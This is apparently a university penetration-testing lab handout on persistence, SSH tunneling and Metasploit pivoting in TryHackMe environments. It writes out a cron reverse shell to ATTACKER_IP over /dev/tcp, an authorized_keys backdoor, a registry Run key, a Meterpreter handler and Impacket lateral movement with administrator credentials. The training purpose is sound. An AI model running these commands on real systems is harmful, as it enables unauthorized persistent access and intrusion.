# Lab Activity: Module 13 — Maintaining Access & Pivoting

## Course: CIS-4333 Penetration Testing

**Certification Alignment:** CompTIA PenTest+ (PT0-002)

---

## Lab Overview

In this lab you will practice persistence mechanisms, SSH-based pivoting, and lateral movement using a multi-host lab environment. The lab is structured in three parts: Linux persistence (Part 1), SSH tunneling and proxychains (Part 2), and Metasploit pivoting and lateral movement (Part 3).

This lab uses TryHackMe's "Post-Exploitation Basics" room for Parts 1 and 3, and the "Wreath" network room for Part 2 (pivoting). Both rooms are available on TryHackMe and provide browser-accessible environments.

Estimated time: 120–150 minutes.

---

## Learning Objectives

By the end of this lab, you will be able to:

- Add a persistence mechanism to a Linux system via cron job and SSH authorized keys
- Add a persistence mechanism to a Windows system via registry Run key
- Configure SSH dynamic port forwarding and use proxychains to route nmap through the tunnel
- Add a Metasploit route through a Meterpreter session to reach an isolated subnet
- Execute lateral movement using Impacket psexec.py or wmiexec.py with valid credentials
- Document persistence and cleanup steps in an engagement log format

---

## Prerequisites

- TryHackMe account (free tier is sufficient for Post-Exploitation Basics; Wreath requires a premium subscription or can be replaced with a VulnHub multi-machine setup)
- Kali Linux VM or the TryHackMe AttackBox
- Basic familiarity with SSH, Metasploit, and Linux/Windows command lines from previous modules

---

## Lab Safety and Authorization Notice

All activities in this lab must be performed exclusively in the authorized lab environment. Never apply persistence mechanisms to any system you do not own or have explicit written permission to test. Registry modifications, cron jobs, and SSH key installation are detectable artifacts — always clean them up when the authorized lab exercise is complete.

---

## Part 1 — Persistence Mechanisms (35–45 minutes)

### Step 1.1 — Linux Cron Persistence

1. Access the TryHackMe "Post-Exploitation Basics" target machine (Linux).
2. Confirm your current user:

```bash
whoami && id
```

3. Open the current user's crontab editor:

```bash
crontab -e
```

4. Add the following line at the bottom. Replace `ATTACKER_IP` with your AttackBox or Kali IP:

```
* * * * * /bin/bash -c 'bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1'
```

5. On your attack machine, start a listener:

```bash
nc -lvnp 4444
```

6. Wait up to 60 seconds for the cron job to fire. A connection should appear in your listener.
7. Verify the session by running `id` in the received shell.

**Deliverable 1.1:** Screenshot of the netcat listener receiving the reverse shell connection from the cron job, with `id` output visible.

### Step 1.2 — SSH Authorized Key Persistence

1. On your attack machine, generate an SSH key pair:

```bash
ssh-keygen -t ed25519 -f lab13_key -N ""
```

2. Display the public key:

```bash
cat lab13_key.pub
```

3. On the target machine, append this public key to the authorized keys:

```bash
mkdir -p ~/.ssh
chmod 700 ~/.ssh
echo "YOUR_PUBLIC_KEY_HERE" >> ~/.ssh/authorized_keys
chmod 600 ~/.ssh/authorized_keys
```

4. Test SSH key authentication from your attack machine:

```bash
ssh -i lab13_key user@TARGET_IP
```

5. Confirm access without a password prompt.

**Deliverable 1.2:** Screenshot showing successful SSH login using the key pair, without a password prompt.

### Step 1.3 — Windows Registry Run Key Persistence

1. Access the Windows target machine in the lab environment (via RDP or the provided shell).
2. Create a test payload — for this exercise, a simple batch file that writes a file to confirm execution:

```cmd
echo "echo persistence_test > C:\persistence_test.txt" > C:\Users\user\test_persist.bat
```

3. Add the batch file to the registry Run key:

```cmd
reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v LabTest /t REG_SZ /d "C:\Users\user\test_persist.bat" /f
```

4. Verify the key was added:

```cmd
reg query HKCU\Software\Microsoft\Windows\CurrentVersion\Run
```

5. Log off and log back on. Verify the payload executed by checking for `C:\persistence_test.txt`.

**Deliverable 1.3:** Screenshot of `reg query` output showing the Run key entry, and a screenshot confirming the payload executed after logon.

### Step 1.4 — Cleanup

Immediately clean up all persistence mechanisms from Steps 1.1–1.3:

1. Remove the cron job:

```bash
crontab -e
# Delete the line you added, save and exit
```

2. Remove the SSH authorized key:

```bash
# Edit ~/.ssh/authorized_keys and remove the line containing lab13_key
nano ~/.ssh/authorized_keys
```

3. Remove the registry Run key:

```cmd
reg delete HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v LabTest /f
```

4. Delete the test files.

**Deliverable 1.4:** Screenshots confirming the cron entry is removed, the authorized_keys file no longer contains the lab key, and the registry key is deleted.

---

## Part 2 — SSH Tunneling and Proxychains (35–45 minutes)

This part uses a two-machine scenario: you have SSH access to a jump host (`JUMP_IP`) that has visibility into an internal network (`192.168.100.0/24`) that your attack machine cannot reach directly.

If using TryHackMe Wreath, the room provides this exact topology. If not, simulate it with two VMs: one acting as the jump host and one as the internal target.

### Step 2.1 — Configure Dynamic Port Forwarding

1. Establish an SSH connection with dynamic port forwarding to the jump host:

```bash
ssh -D 9050 -f -N user@JUMP_IP
```

The `-D 9050` flag creates a SOCKS5 proxy on local port 9050. `-f` sends SSH to the background. `-N` suppresses command execution (we only want the tunnel).

2. Verify the tunnel is active:

```bash
ss -tlnp | grep 9050
```

The port 9050 should appear as a listening socket.

**Deliverable 2.1:** Screenshot of `ss -tlnp` output confirming port 9050 is listening.

### Step 2.2 — Configure Proxychains

1. Edit the proxychains configuration:

```bash
sudo nano /etc/proxychains4.conf
```

2. At the bottom of the file, ensure the following line exists (remove any other proxy lines):

```
socks5 127.0.0.1 9050
```

3. Also ensure `strict_chain` is uncommented and `dynamic_chain` is commented out, or use `dynamic_chain` for resilience.

**Deliverable 2.2:** Screenshot of the relevant section of `/etc/proxychains4.conf` showing the correct SOCKS5 configuration.

### Step 2.3 — Scan the Internal Network Through the Tunnel

1. Run an nmap scan through proxychains to the internal network. Note: proxychains requires TCP connect scans (`-sT`), not SYN scans:

```bash
proxychains nmap -sT -Pn -p 22,80,445,3389 192.168.100.0/24
```

2. Observe that nmap traffic is routing through the jump host to reach the internal network.

**Deliverable 2.3:** Screenshot of nmap scan output showing hosts in the `192.168.100.0/24` range responding, confirming traffic is routing through the tunnel.

### Step 2.4 — Local Port Forward to Reach an Internal Web Service

1. If an internal host (`192.168.100.10`) is running a web service on port 80, create a local port forward to access it in your browser:

```bash
ssh -L 8080:192.168.100.10:80 user@JUMP_IP
```

2. Navigate to `http://localhost:8080` in your browser.
3. Confirm the internal web application loads through the tunnel.

**Deliverable 2.4:** Screenshot of the internal web application loading in your browser at `localhost:8080`.

---

## Part 3 — Metasploit Pivoting and Lateral Movement (30–40 minutes)

### Step 3.1 — Establish a Meterpreter Session on the Pivot Host

1. In Metasploit, configure a `multi/handler` listener:

```
msf> use exploit/multi/handler
msf> set PAYLOAD linux/x86/meterpreter/reverse_tcp
msf> set LHOST YOUR_ATTACK_IP
msf> set LPORT 4443
msf> run
```

2. Execute a Meterpreter payload on the pivot host (the TryHackMe lab room will provide the mechanism).
3. Confirm the Meterpreter session is active.

### Step 3.2 — Add a Route to the Internal Subnet

1. From the Metasploit console with an active session:

```
msf> route add 192.168.100.0/24 <session_id>
msf> route print
```

2. Confirm the route is displayed.

**Deliverable 3.2:** Screenshot of `route print` in Metasploit showing the route to the internal subnet through the session.

### Step 3.3 — Scan Through the Route

1. Run an Metasploit port scan module through the route:

```
msf> use auxiliary/scanner/portscan/tcp
msf> set RHOSTS 192.168.100.0/24
msf> set PORTS 22,80,445,3389
msf> run
```

2. Note which hosts respond on which ports.

**Deliverable 3.3:** Screenshot of the Metasploit portscan results showing internal hosts.

### Step 3.4 — Lateral Movement with Impacket

1. Using credentials or hashes obtained during earlier post-exploitation, attempt lateral movement to an internal Windows host:

```bash
proxychains python3 /usr/share/doc/python3-impacket/examples/wmiexec.py domain/administrator:Password123@192.168.100.20
```

2. Execute a command on the remote host to confirm access:

```cmd
whoami
hostname
```

**Deliverable 3.4:** Screenshot showing the WMI shell on the internal host with `whoami` output confirming you are running as administrator or SYSTEM.

---

## Part 4 — Engagement Log (All Students)

Maintain an engagement log throughout this lab. The engagement log documents every modification made during the test. Submit the log as part of your deliverables.

Use this format for each entry:

| Time | System | Action | Details | Reverted? |
|------|--------|---------|---------|-----------|
| HH:MM | hostname | Cron persistence added | `* * * * * /bin/bash -c ...` | Yes — HH:MM |
| HH:MM | hostname | SSH key added to authorized_keys | Key fingerprint: SHA256:... | Yes — HH:MM |
| HH:MM | Windows hostname | Registry Run key added | HKCU\...\Run — LabTest | Yes — HH:MM |

Include at minimum: all persistence additions and their cleanup confirmations from Part 1, the SSH tunnel established in Part 2, and the Metasploit route added in Part 3.

---

## Reflection Questions

Answer these questions in your submission:

1. Explain why SSH dynamic port forwarding is more versatile than local port forwarding for penetration testing. In what scenario would local forwarding be more appropriate?

2. What Windows event log entries would be generated by adding a registry Run key? What event IDs should a defender monitor to detect this persistence mechanism?

3. If a client's Rules of Engagement do not mention cleanup, what should you do? What is the professional and ethical obligation when the RoE is silent on artifact removal?

---

## Submission Checklist

Before submitting, confirm you have included:

- [ ] Deliverable 1.1: Cron reverse shell screenshot
- [ ] Deliverable 1.2: SSH key authentication screenshot
- [ ] Deliverable 1.3: Registry Run key screenshots
- [ ] Deliverable 1.4: Cleanup confirmation screenshots
- [ ] Deliverable 2.1: Port 9050 listening confirmation
- [ ] Deliverable 2.2: Proxychains configuration screenshot
- [ ] Deliverable 2.3: Nmap through tunnel results
- [ ] Deliverable 2.4: Internal web app screenshot
- [ ] Deliverable 3.2: Metasploit route print screenshot
- [ ] Deliverable 3.3: Internal port scan results
- [ ] Deliverable 3.4: Lateral movement shell screenshot
- [ ] Engagement log with all entries and cleanup confirmations
- [ ] Three reflection question answers

Submit all content as a single PDF or ZIP file to the Canvas assignment portal.

---

*End of Module 13 Lab Activity*
